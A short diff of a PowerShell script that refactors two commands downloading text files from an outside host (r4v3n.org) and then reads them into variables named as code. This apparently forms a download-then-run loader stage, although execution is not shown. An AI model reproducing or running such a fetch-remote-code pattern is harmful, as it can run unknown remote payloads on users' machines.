@@ -1,5 +1,11 @@
-(New-Object System.Net.WebClient).DownloadFile('https://r4v3n.org/rr/car/car1.txt', 'car1.txt');
-(New-Object System.Net.WebClient).DownloadFile('https://r4v3n.org/rr/car/car2.txt', 'car2.txt');
+$url1 = "https://r4v3n.org/rr/car/car1.txt"
+$output1 = "car1.txt"
+
+$url2 = "https://r4v3n.org/rr/car/car2.txt"
+$output2 = "car2.txt"
+
+(New-Object System.Net.WebClient).DownloadFile($url1, $output1);
+(New-Object System.Net.WebClient).DownloadFile($url2, $output2);
 
 $code1 = [IO.File]::ReadAllText('car1.txt');
 $code2 = [IO.File]::ReadAllText('car2.txt');
